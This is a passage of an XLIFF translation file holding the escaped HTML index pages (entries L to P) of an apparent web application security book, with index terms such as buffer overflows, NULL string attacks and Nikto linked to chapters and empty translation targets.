										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html" style="font-weight:bold;"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch06lev1sec1.html#iddle1347"&gt; language-based attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="ch06lev1sec2.html#iddle1348"&gt; buffer overflows&lt;/a&gt;&lt;a class="v2" href="ch10lev1sec4.html#iddle1349"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1350"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1351"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1352"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app02.html#iddle1353"&gt; saveuser.php&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1354"&gt; canonicalization&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1355"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1356"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1357"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1358"&gt; NULL string attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1359"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1360"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1361"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1362"&gt; LANs (local-area networks)&lt;/a&gt;&lt;a class="v2" href="ch01lev1sec5.html#iddle1363"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec3.html#iddle1364"&gt; legacy code&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1365"&gt; lifecycle of bugs&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1366"&gt; list boxes&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1367"&gt; load balancing&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1368"&gt; local-area networks (LANs)&lt;/a&gt;&lt;a class="v2" href="ch01lev1sec5.html#iddle1369"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1370"&gt; login.php&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=K.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=M.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=L.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html" style="font-weight:bold;"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch02lev1sec2.html#iddle1371"&gt; mapping out Web application's architecture&lt;/a&gt;&lt;a class="v2" href="ch02lev1sec2.html#iddle1372"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec1.html#iddle1373"&gt; Mauchley, John&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1374"&gt; MAXLENGTH attribute&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1375"&gt; messages, saving verbose messages&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;verbose messages&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch02lev1sec2.html#iddle1376"&gt; saving&lt;/a&gt;&lt;br /&gt;methods&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="app01lev1sec6.html#iddle1377"&gt; extreme programming methods&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;  &lt;a class="v2" href="app01lev1sec4.html#iddle1378"&gt; formal methods&lt;/a&gt;&lt;a class="v2" href="app01lev1sec6.html#iddle1379"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec3.html#iddle1380"&gt; metrics&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1381"&gt; Microsoft, HTTP cookies&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec3.html#iddle1382"&gt; mining for files, Wikto&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=L.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=N.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=M.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html" style="font-weight:bold;"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch10lev1sec4.html#iddle1383"&gt; nested XML elements, recursive payload attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1384"&gt; .NET&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1385"&gt; networks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;client-server networks
 [See  &lt;a class="docLink" href="index&amp;amp;view=C.html#iddle1124"&gt;client-server networks&lt;/a&gt;.]&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec5.html#iddle1387"&gt; UNIX networks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch01lev1sec5.html#iddle1388"&gt; Windows networks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app03lev1sec1.html#iddle1389"&gt; Nikto&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1390"&gt; nonce&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1391"&gt; NULL string attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1392"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1393"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1394"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1395"&gt; numbering documents&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=M.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=O.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=N.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html" style="font-weight:bold;"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch09lev1sec9.html#iddle1396"&gt; OLE (Object Linking and Embedding)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1397"&gt; one-timepad&lt;/a&gt;&lt;br /&gt;online privacy
 [See  &lt;a class="docLink" href="index&amp;amp;view=P.html#iddle1433"&gt;privacy&lt;/a&gt;.]&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1399"&gt; online shopping&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1400"&gt; Open Source Vulnerability Database&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1401"&gt; OpenSSL&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1402"&gt; operations, XOR&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1403"&gt; Oracle, stored procedures&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec4.html#iddle1404"&gt; oversize payload attacks&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=N.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=P.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=O.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
